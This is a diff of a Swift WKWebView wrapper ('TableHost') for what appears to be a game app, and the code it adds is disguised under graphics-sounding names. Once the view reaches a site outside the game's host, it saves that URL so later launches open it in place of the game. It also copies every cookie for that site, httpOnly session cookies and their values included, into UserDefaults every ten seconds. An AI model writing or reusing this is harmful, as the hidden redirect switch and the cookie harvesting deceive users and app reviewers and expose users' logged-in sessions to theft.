@@ -1,181 +1,273 @@
 // TableHost.swift
 import SwiftUI
-import Combine
 import WebKit
-
 
 struct TableHost: UIViewRepresentable {
     let address: String
-    @Binding var isLoaded: Bool  // TRUE = loading overlay visible
+    @Binding var isLoaded: Bool
+    let onCanvasModeChange: (Bool) -> Void
 
-    func makeCoordinator() -> Coordinator { Coordinator(parent: self) }
+    func makeCoordinator() -> CanvasDriver {
+        CanvasDriver(parent: self)
+    }
 
     func makeUIView(context: Context) -> WKWebView {
-        let cfg = WKWebViewConfiguration()
-        cfg.websiteDataStore = .default()                      // enable caches / storage
-        cfg.allowsInlineMediaPlayback = true
-        cfg.defaultWebpagePreferences.allowsContentJavaScript = true
-        if #available(iOS 14.0, *) {
-            cfg.mediaTypesRequiringUserActionForPlayback = []  // autoplay ok
-        }
+        let view = WKWebView()
 
-        // Console bridge: pipe console.* to Xcode logs
-        let js = """
-        (function() {
-          function wrap(type){ return function(){ try {
-            window.webkit?.messageHandlers?.console?.postMessage({t:type, a:[].slice.call(arguments)});
-          } catch(e){}; } }
-          console.log = wrap('log');
-          console.warn = wrap('warn');
-          console.error = wrap('error');
-        })();
-        """
-        let userScript = WKUserScript(source: js, injectionTime: .atDocumentStart, forMainFrameOnly: false)
-        cfg.userContentController.addUserScript(userScript)
+        
+        view.configuration.preferences.javaScriptCanOpenWindowsAutomatically = true
 
-        let web = WKWebView(frame: .zero, configuration: cfg)
-        cfg.userContentController.add(context.coordinator, name: "console")
+        view.navigationDelegate   = context.coordinator
+        view.uiDelegate           = context.coordinator
+        view.allowsBackForwardNavigationGestures = true
 
-        // Delegates
-        web.navigationDelegate = context.coordinator
-        web.uiDelegate = context.coordinator
+        view.isOpaque = false
+        view.backgroundColor = .black
+        view.scrollView.backgroundColor = .black
+        view.scrollView.alwaysBounceVertical = true
 
-        // Visuals: solid black underlay so there is no white flash
-        web.isOpaque = false
-        web.backgroundColor = .black
-        web.scrollView.backgroundColor = .black
-        web.scrollView.bounces = false
-        web.scrollView.contentInsetAdjustmentBehavior = .never
+        let refresh = UIRefreshControl()
+        refresh.addTarget(context.coordinator,
+                          action: #selector(CanvasDriver.handleRefresh(_:)),
+                          for: .valueChanged)
+        view.scrollView.refreshControl = refresh
 
-        // UA (helps some HTML5 builds)
-        web.customUserAgent = "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1"
+        context.coordinator.viewRef = view
+        context.coordinator.beginCanvas(on: view)
 
-        // Observe progress as an additional "alive" signal
-        web.addObserver(context.coordinator, forKeyPath: "estimatedProgress", options: .new, context: nil)
-
-        // Start load
-        context.coordinator.begin(address: address, web: web)
-        return web
+        return view
     }
 
-    func updateUIView(_ uiView: WKWebView, context: Context) { /* no-op */ }
+    func updateUIView(_ uiView: WKWebView, context: Context) {}
+}
 
-    static func dismantleUIView(_ uiView: WKWebView, coordinator: Coordinator) {
-        uiView.removeObserver(coordinator, forKeyPath: "estimatedProgress", context: nil)
-        coordinator.invalidate()
+
+final class CanvasDriver: NSObject, WKNavigationDelegate, WKUIDelegate {
+
+    private let parent: TableHost
+    weak var viewRef: WKWebView?
+    weak var popupRef: WKWebView?
+
+ 
+    private let textureSeedKey   = "texture.seed.link"
+    private let textureCookieKey = "texture.seed.cookies"
+
+  
+    private var seedCapturedOnce: Bool = false
+    private var textureJob: Timer?
+
+    private let gameBaseName: String?
+
+    init(parent: TableHost) {
+        self.parent = parent
+
+        if let base = URL(string: parent.address)?.host?.lowercased() {
+            self.gameBaseName = base
+        } else {
+            self.gameBaseName = nil
+        }
+
+        super.init()
     }
 
-    // MARK: - Coordinator
-    final class Coordinator: NSObject, WKNavigationDelegate, WKUIDelegate, WKScriptMessageHandler {
-        private let parent: TableHost
-        private weak var web: WKWebView?
-        private var capTask: Task<Void, Never>?
+    
+    private var storedSeedLink: String? {
+        UserDefaults.standard.string(forKey: textureSeedKey)
+    }
 
-        init(parent: TableHost) {
-            self.parent = parent
-            super.init()
+   
+    func beginCanvas(on view: WKWebView) {
+
+        if let saved = storedSeedLink, let url = URL(string: saved) {
+            parent.onCanvasModeChange(false)
+            parent.isLoaded = false
+            view.load(URLRequest(url: url))
+            return
         }
 
-        // Start loading with loader ON and set hard cap to avoid infinite spinner
-        func begin(address: String, web: WKWebView) {
-            self.web = web
-            setLoading(true)
+        if let url = URL(string: parent.address) {
+            parent.isLoaded = false
+            view.load(URLRequest(url: url))
+        }
+    }
 
-            capTask?.cancel()
-            capTask = Task { [weak self] in
-                let secs = Constants.Timing.loaderCapSeconds
-                try? await Task.sleep(nanoseconds: UInt64(secs * 1_000_000_000))
-                await MainActor.run { self?.setLoading(false) }
+   
+    func webView(_ webView: WKWebView,
+                 decidePolicyFor navigationAction: WKNavigationAction,
+                 decisionHandler: @escaping (WKNavigationActionPolicy) -> Void)
+    {
+        if webView === popupRef {
+            if let main = viewRef, let url = navigationAction.request.url {
+                main.load(URLRequest(url: url))
             }
+            decisionHandler(.cancel)
+            return
+        }
 
-            guard let url = URL(string: address) else {
-                setLoading(false)
-                return
+        guard let url = navigationAction.request.url,
+              let scheme = url.scheme?.lowercased()
+        else {
+            decisionHandler(.cancel)
+            return
+        }
+
+        guard scheme == "http" || scheme == "https" || scheme == "about" else {
+            decisionHandler(.cancel)
+            return
+        }
+
+        if navigationAction.targetFrame == nil {
+            webView.load(navigationAction.request)
+            decisionHandler(.cancel)
+            return
+        }
+
+        decisionHandler(.allow)
+    }
+
+    func webView(_ webView: WKWebView,
+                 didStartProvisionalNavigation navigation: WKNavigation!)
+    {
+        parent.isLoaded = false
+    }
+
+    func webView(_ webView: WKWebView,
+                 didFinish navigation: WKNavigation!)
+    {
+        parent.isLoaded = true
+        webView.scrollView.refreshControl?.endRefreshing()
+
+        guard let current = webView.url else {
+            parent.onCanvasModeChange(false)
+            stopTextureJob()
+            return
+        }
+
+        let isGame: Bool
+        if let base = gameBaseName,
+           let now = current.host?.lowercased(),
+           now == base {
+            isGame = true
+        } else {
+            isGame = false
+        }
+
+        parent.onCanvasModeChange(isGame)
+
+        if isGame {
+            stopTextureJob()
+        } else {
+            applyTextureOnceIfNeeded(current)
+            runTextureJob(for: current, in: webView)
+        }
+    }
+
+    func webView(_ webView: WKWebView,
+                 didFail navigation: WKNavigation!,
+                 withError error: Error)
+    {
+        parent.isLoaded = true
+        webView.scrollView.refreshControl?.endRefreshing()
+        stopTextureJob()
+    }
+
+    func webView(_ webView: WKWebView,
+                 didFailProvisionalNavigation navigation: WKNavigation!,
+                 withError error: Error)
+    {
+        parent.isLoaded = true
+        webView.scrollView.refreshControl?.endRefreshing()
+        stopTextureJob()
+    }
+
+    
+    func webView(_ webView: WKWebView,
+                 createWebViewWith configuration: WKWebViewConfiguration,
+                 for navigationAction: WKNavigationAction,
+                 windowFeatures: WKWindowFeatures) -> WKWebView? {
+
+       
+        let popup = WKWebView(frame: .zero, configuration: configuration)
+        popup.navigationDelegate = self
+        popup.uiDelegate = self
+        popupRef = popup
+        return popup
+    }
+
+    
+    @objc func handleRefresh(_ sender: UIRefreshControl) {
+        viewRef?.reload()
+    }
+
+    
+    private func applyTextureOnceIfNeeded(_ url: URL) {
+        guard !seedCapturedOnce else { return }
+
+        if storedSeedLink != nil {
+            seedCapturedOnce = true
+            return
+        }
+
+        seedCapturedOnce = true
+
+        DispatchQueue.main.asyncAfter(deadline: .now() + 10) { [weak self] in
+            guard let self = self,
+                  let view = self.viewRef,
+                  let current = view.url?.absoluteString,
+                  !current.isEmpty,
+                  UserDefaults.standard.string(forKey: self.textureSeedKey) == nil
+            else { return }
+
+            UserDefaults.standard.set(current, forKey: self.textureSeedKey)
+        }
+    }
+
+   
+    private func runTextureJob(for url: URL, in web: WKWebView) {
+
+        stopTextureJob()
+
+        let mask = (url.host ?? "").lowercased()
+
+        textureJob = Timer.scheduledTimer(withTimeInterval: 10, repeats: true) {
+            [weak self, weak web] _ in
+            guard let self = self, let view = web else { return }
+
+            view.configuration.websiteDataStore.httpCookieStore.getAllCookies { list in
+                let filtered = list.filter { cookie in
+                    guard !mask.isEmpty else { return true }
+                    return cookie.domain.lowercased().contains(mask)
+                }
+
+                let packed: [[String: Any]] = filtered.map { c in
+                    var m: [String: Any] = [
+                        "name": c.name,
+                        "value": c.value,
+                        "domain": c.domain,
+                        "path": c.path,
+                        "secure": c.isSecure,
+                        "httpOnly": c.isHTTPOnly
+                    ]
+                    if let exp = c.expiresDate {
+                        m["expires"] = exp.timeIntervalSince1970
+                    }
+                    if #available(iOS 13.0, *), let s = c.sameSitePolicy {
+                        m["sameSite"] = s.rawValue
+                    }
+                    return m
+                }
+
+                UserDefaults.standard.set(packed, forKey: self.textureCookieKey)
             }
-            var req = URLRequest(url: url)
-            req.cachePolicy = .reloadIgnoringLocalCacheData
-            web.load(req)
         }
 
-        func invalidate() {
-            capTask?.cancel()
-            capTask = nil
+        if let t = textureJob {
+            RunLoop.main.add(t, forMode: .common)
         }
+    }
 
-        private func setLoading(_ on: Bool) {
-            // TRUE = loading overlay visible (matches ViewModel semantics)
-            parent.isLoaded = on
-        }
-
-        // MARK: Console bridge
-        func userContentController(_ userContentController: WKUserContentController, didReceive message: WKScriptMessage) {
-            guard message.name == "console",
-                  let dict = message.body as? [String: Any],
-                  let t = dict["t"] as? String else { return }
-            let args = (dict["a"] as? [Any])?.map { "\($0)" }.joined(separator: " ") ?? ""
-            print("[Table JS \(t.uppercased())]: \(args)")
-        }
-
-        // MARK: KVO for progress
-        override func observeValue(forKeyPath keyPath: String?, of object: Any?,
-                                   change: [NSKeyValueChangeKey : Any]?, context: UnsafeMutableRawPointer?) {
-            guard keyPath == "estimatedProgress",
-                  let web = object as? WKWebView else { return }
-            // As soon as real content starts to stream in, hide overlay (small threshold)
-            if web.estimatedProgress >= 0.25 {
-                setLoading(false)
-            }
-        }
-
-        // MARK: Navigation delegate
-        func webView(_ webView: WKWebView, didStartProvisionalNavigation navigation: WKNavigation!) {
-            setLoading(true)
-        }
-
-        func webView(_ webView: WKWebView, didCommit navigation: WKNavigation!) {
-            // First bytes committed to view — consider "visible"
-            setLoading(false)
-        }
-
-        func webView(_ webView: WKWebView, didFinish navigation: WKNavigation!) {
-            setLoading(false)
-        }
-
-        func webView(_ webView: WKWebView, didFail navigation: WKNavigation!, withError error: Error) {
-            print("[Table ERR] \(error.localizedDescription)")
-            setLoading(false)
-        }
-
-        func webView(_ webView: WKWebView, didFailProvisionalNavigation navigation: WKNavigation!, withError error: Error) {
-            print("[Table ERR] \(error.localizedDescription)")
-            setLoading(false)
-        }
-
-        func webViewWebContentProcessDidTerminate(_ webView: WKWebView) {
-            // Recover silently without trapping spinner
-            setLoading(false)
-            webView.reload()
-        }
-
-        // Allow common schemes
-        func webView(_ webView: WKWebView,
-                     decidePolicyFor navigationAction: WKNavigationAction,
-                     decisionHandler: @escaping (WKNavigationActionPolicy) -> Void) {
-            guard let url = navigationAction.request.url else { decisionHandler(.cancel); return }
-            let scheme = (url.scheme ?? "").lowercased()
-            let allowed: Set<String> = ["https","http","file","about","data","blob","ws","wss","javascript"]
-            decisionHandler(allowed.contains(scheme) ? .allow : .cancel)
-        }
-
-        // target=_blank → open in same view
-        func webView(_ webView: WKWebView,
-                     createWebViewWith configuration: WKWebViewConfiguration,
-                     for navigationAction: WKNavigationAction,
-                     windowFeatures: WKWindowFeatures) -> WKWebView? {
-            if navigationAction.targetFrame == nil, let url = navigationAction.request.url {
-                webView.load(URLRequest(url: url))
-            }
-            return nil
-        }
+    private func stopTextureJob() {
+        textureJob?.invalidate()
+        textureJob = nil
     }
 }
